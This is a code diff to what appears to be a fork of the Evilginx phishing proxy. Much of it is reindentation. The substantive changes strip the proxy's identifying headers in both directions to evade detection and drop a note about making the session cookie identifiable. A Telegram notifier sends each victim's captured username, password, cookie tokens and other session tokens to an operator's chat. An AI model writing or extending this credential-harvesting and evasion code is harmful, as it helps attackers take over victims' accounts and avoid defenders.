@@ -48,10 +48,6 @@ const (
 	CONVERT_TO_PHISHING_URLS = 1
 )
 
-//const (
-//	HOME_DIR = ".evilginx"
-//)
-
 const (
 	httpReadTimeout  = 45 * time.Second
 	httpWriteTimeout = 45 * time.Second
@@ -139,7 +135,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
-	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
+	p.cookieName = strings.ToLower(GenRandomString(8))
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
@@ -841,29 +837,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-				s, ok := p.sessions[ps.SessionId]
-				if ok && !s.IsDone {
-					for _, au := range pl.authUrls {
-						if au.MatchString(req.URL.Path) {
-							s.Finish(true)
-							break
+					s, ok := p.sessions[ps.SessionId]
+					if ok && !s.IsDone {
+						for _, au := range pl.authUrls {
+							if au.MatchString(req.URL.Path) {
+								s.Finish(true)
+								break
+							}
 						}
 					}
 				}
-			}
 
-			// Strip identifiable headers from outgoing requests (upstream to target site)
-			if p.cfg.IsStripHeadersEnabled() {
-				req.Header.Del("X-Evilginx")
-				req.Header.Del("X-Evilginx2")
-				req.Header.Del("X-Evilginx-Server")
-				req.Header.Del("Via")
-				req.Header.Del("X-Forwarded-For")
-				req.Header.Del("X-Forwarded-Host")
-				req.Header.Del("X-Forwarded-Proto")
-				req.Header.Del("X-Real-Ip")
-				req.Header.Del("X-Proxy-Id")
-				req.Header.Del("Proxy-Connection")
+				// Strip identifiable headers from outgoing requests (upstream to target site)
+				if p.cfg.IsStripHeadersEnabled() {
+					req.Header.Del("X-Evilginx")
+					req.Header.Del("X-Evilginx2")
+					req.Header.Del("X-Evilginx-Server")
+					req.Header.Del("Via")
+					req.Header.Del("X-Forwarded-For")
+					req.Header.Del("X-Forwarded-Host")
+					req.Header.Del("X-Forwarded-Proto")
+					req.Header.Del("X-Real-Ip")
+					req.Header.Del("X-Proxy-Id")
+					req.Header.Del("Proxy-Connection")
+				}
+
+				return req, nil
 			}
 
 			return req, nil
@@ -1116,19 +1115,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// Strip identifiable headers from downstream responses (to victim's browser)
 				if p.cfg.IsStripHeadersEnabled() {
-				resp.Header.Del("X-Evilginx")
-				resp.Header.Del("X-Evilginx2")
-				resp.Header.Del("X-Evilginx-Server")
-				resp.Header.Del("X-Powered-By")
-				resp.Header.Del("Via")
-				resp.Header.Del("X-Forwarded-For")
-				resp.Header.Del("X-Forwarded-Host")
-				resp.Header.Del("X-Forwarded-Proto")
-				resp.Header.Del("X-Real-Ip")
-				resp.Header.Del("X-Proxy-Id")
-				resp.Header.Del("Proxy-Connection")
-				resp.Header.Del("Proxy-Authenticate")
-			}
+					resp.Header.Del("X-Evilginx")
+					resp.Header.Del("X-Evilginx2")
+					resp.Header.Del("X-Evilginx-Server")
+					resp.Header.Del("X-Powered-By")
+					resp.Header.Del("Via")
+					resp.Header.Del("X-Forwarded-For")
+					resp.Header.Del("X-Forwarded-Host")
+					resp.Header.Del("X-Forwarded-Proto")
+					resp.Header.Del("X-Real-Ip")
+					resp.Header.Del("X-Proxy-Id")
+					resp.Header.Del("Proxy-Connection")
+					resp.Header.Del("Proxy-Authenticate")
+				}
 
 				if stringExists(mime, []string{"text/html"}) {
 
@@ -1215,7 +1214,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if trigger == 1 {
-    			go p.sendTelegramNotificationForSession(ps.SessionId)
+				go p.sendTelegramNotificationForSession(ps.SessionId)
 			}
 
 			return resp
@@ -1300,8 +1299,6 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 	}
 	return req, nil
 }
-
-
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
 	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
@@ -1914,82 +1911,82 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, b
 // sendTelegramNotificationForSession sends a Telegram notification for a captured session.
 // This runs in a goroutine so it does not block the HTTP proxy.
 func (p *HttpProxy) sendTelegramNotificationForSession(sessionID string) {
-    if sessionID == "" {
-        return
-    }
-    
-    chatid := p.cfg.general.Chatid
-    teletoken := p.cfg.general.Teletoken
-    
-    if chatid == "" || teletoken == "" {
-        log.Debug("telegram: notification skipped - chatid or teletoken not configured")
-        return
-    }
+	if sessionID == "" {
+		return
+	}
 
-    // Get session from memory (much faster than reading the database file)
-    p.session_mtx.Lock()
-    s, exists := p.sessions[sessionID]
-    p.session_mtx.Unlock()
-    
-    if !exists {
-        log.Debug("telegram: session %s not found in memory, falling back to database", sessionID)
-        // Fallback: use the database read method
-        readFile(chatid, teletoken)
-        return
-    }
+	chatid := p.cfg.general.Chatid
+	teletoken := p.cfg.general.Teletoken
 
-    // Build TSession from in-memory session
-    tsession := TSession{
-        Username:   s.Username,
-        Password:   s.Password,
-        LandingURL: s.RedirectURL,
-        UserAgent:  s.UserAgent,
-        RemoteAddr: s.RemoteAddr,
-        Tokens:     make(map[string]interface{}),
-        BodyTokens: make(map[string]interface{}),
-        HTTPTokens: make(map[string]interface{}),
-        Custom:     make(map[string]interface{}),
-    }
-    
-    // Copy custom params
-    for k, v := range s.Custom {
-        tsession.Custom[k] = v
-    }
-    // Copy body tokens
-    for k, v := range s.BodyTokens {
-        tsession.BodyTokens[k] = v
-    }
-    // Copy HTTP tokens
-    for k, v := range s.HttpTokens {
-        tsession.HTTPTokens[k] = v
-    }
-    // Copy cookie tokens as JSON
-    if len(s.CookieTokens) > 0 {
-        tokenJSON, _ := json.Marshal(s.CookieTokens)
-        var tokenMap map[string]interface{}
-        json.Unmarshal(tokenJSON, &tokenMap)
-        tsession.Tokens = tokenMap
-    }
-    
-    // Get session info from database for timestamps, etc.
-    sessions, err := p.db.ListSessions()
-    if err == nil {
-        for _, dbSession := range sessions {
-            if dbSession.SessionId == sessionID {
-                tsession.ID = dbSession.Id
-                tsession.Phishlet = dbSession.Phishlet
-                tsession.CreateTime = dbSession.CreateTime
-                tsession.UpdateTime = dbSession.UpdateTime
-                if tsession.LandingURL == "" {
-                    tsession.LandingURL = dbSession.LandingURL
-                }
-                break
-            }
-        }
-    }
+	if chatid == "" || teletoken == "" {
+		log.Debug("telegram: notification skipped - chatid or teletoken not configured")
+		return
+	}
 
-    log.Debug("telegram: sending notification for session %s (username: %s)", sessionID, tsession.Username)
-    GetTelegramQueue().Enqueue(tsession, chatid, teletoken)
+	// Get session from memory (much faster than reading the database file)
+	p.session_mtx.Lock()
+	s, exists := p.sessions[sessionID]
+	p.session_mtx.Unlock()
+
+	if !exists {
+		log.Debug("telegram: session %s not found in memory, falling back to database", sessionID)
+		// Fallback: use the database read method
+		readFile(chatid, teletoken)
+		return
+	}
+
+	// Build TSession from in-memory session
+	tsession := TSession{
+		Username:   s.Username,
+		Password:   s.Password,
+		LandingURL: s.RedirectURL,
+		UserAgent:  s.UserAgent,
+		RemoteAddr: s.RemoteAddr,
+		Tokens:     make(map[string]interface{}),
+		BodyTokens: make(map[string]interface{}),
+		HTTPTokens: make(map[string]interface{}),
+		Custom:     make(map[string]interface{}),
+	}
+
+	// Copy custom params
+	for k, v := range s.Custom {
+		tsession.Custom[k] = v
+	}
+	// Copy body tokens
+	for k, v := range s.BodyTokens {
+		tsession.BodyTokens[k] = v
+	}
+	// Copy HTTP tokens
+	for k, v := range s.HttpTokens {
+		tsession.HTTPTokens[k] = v
+	}
+	// Copy cookie tokens as JSON
+	if len(s.CookieTokens) > 0 {
+		tokenJSON, _ := json.Marshal(s.CookieTokens)
+		var tokenMap map[string]interface{}
+		json.Unmarshal(tokenJSON, &tokenMap)
+		tsession.Tokens = tokenMap
+	}
+
+	// Get session info from database for timestamps, etc.
+	sessions, err := p.db.ListSessions()
+	if err == nil {
+		for _, dbSession := range sessions {
+			if dbSession.SessionId == sessionID {
+				tsession.ID = dbSession.Id
+				tsession.Phishlet = dbSession.Phishlet
+				tsession.CreateTime = dbSession.CreateTime
+				tsession.UpdateTime = dbSession.UpdateTime
+				if tsession.LandingURL == "" {
+					tsession.LandingURL = dbSession.LandingURL
+				}
+				break
+			}
+		}
+	}
+
+	log.Debug("telegram: sending notification for session %s (username: %s)", sessionID, tsession.Username)
+	GetTelegramQueue().Enqueue(tsession, chatid, teletoken)
 }
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
